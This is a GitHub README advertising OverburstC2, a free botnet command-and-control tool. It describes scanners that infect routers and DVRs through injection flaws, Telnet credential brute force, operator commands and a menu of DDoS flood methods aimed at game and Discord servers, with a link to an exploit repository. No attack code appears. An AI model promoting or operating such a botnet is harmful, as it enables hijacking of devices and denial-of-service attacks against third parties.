<div align="center">
  <h1>OverburstC2 — Based on SentinelaNet</h1>
  
  <p align="center">
    <img src="https://img.shields.io/badge/status-dev-blue?style=for-the-badge&logo=python" alt="Dev Status">
    <img src="https://img.shields.io/badge/version-1.0-blueviolet?style=for-the-badge&logo=github">
    <img src="https://komarev.com/ghpvc/?username=CirqueiraDev&style=for-the-badge&color=blueviolet&label=Views">
  </p>
  <p align="center">
    <img src="https://github.com/user-attachments/assets/cadc2e29-6d15-4e1a-b70b-639ae325d7d8" alt="Banner">
  </p>
  <p>
    This botnet is an enhanced version of SentinelaNet and is publicly available for free.
  </p>
</div>

<br/>

## 🔧 Loading Bots

You can use a collection of network security evaluation tools designed to identify vulnerabilities in various devices.  
**Intended for educational purposes and authorized security testing only.**

### **DVR Scanner**
- Tests DVR devices for XML injection vulnerabilities in the NTP configuration.

### **ZHONE Router Scanner**
- Tests ZHONE routers for command injection via the ping diagnostic feature.

### **Fiber Router Scanner**
- Scans fiber routers running the BOA web server for command injection vulnerabilities.

### **Telnet Brute Force**
- Attempts common credential combinations on IoT and network devices via Telnet.

### 🧪 Exploits / Scanners / Loaders
- https://github.com/CirqueiraDev/botnet-exploits

<br/>

## 🔐 Admin Commands

| Command | Description |
|--------|-------------|
| `!user` | Add / List / Remove users |
| `!blacklist` | Add / List / Remove blacklisted targets |

## 🧠 CNC Commands

| Command | Description |
|--------|-------------|
| `help`     | Shows list of commands |
| `botnet`   | Displays available botnet attack methods |
| `bots`     | Shows all connected bots |
| `stop`     | Stops all floods in progress |
| `clear`    | Clears the console screen |
| `exit`     | Disconnects from the C&C server |

## 🚀 Payload Methods Available

| Method | Description |
|--------|-------------|
| `.UDP`     | Sends varying size UDP packets to overwhelm the target |
| `.TCP`     | Continuously sends TCP packets to exhaust connections |
| `.SYN`     | Sends SYN requests to flood pending TCP handshakes |
| `.MIX`     | Alternates between TCP and UDP to bypass protections |
| `.VSE`     | Sends Valve Source Engine protocol floods |
| `.FIVEM`   | Specialized payload designed for FiveM servers |
| `.OVHUDP`  | UDP floods with random payloads targeting specific ports |
| `.OVHTCP`  | Randomized byte sequences and terminators to bypass WAFs |
| `.DISCORD` | Specialized UDP packet targeting Discord services |

<p align="center">
  <img src="https://github.com/user-attachments/assets/8ec3e976-3fbe-43f7-831f-cd8859a74d4a" alt="Demo Screenshot">
</p>

<br/>

## ⚠️ Legal Notice

This project is strictly intended for **educational and research purposes only**.  
Misuse of this software may be **illegal** and lead to **criminal penalties**.  
Always use cybersecurity knowledge to **defend systems**, never to attack them.

---

## 🤝 Contributing

Contributions to improve security research tools are welcome, especially those that:
- Improve vulnerability detection
- Add documentation
- Improve code quality
- Enable responsible disclosure support

---

## 👤 Author

- **Discord:** Cirqueira  
- [Instagram Profile](https://www.instagram.com/cirqueirax/)
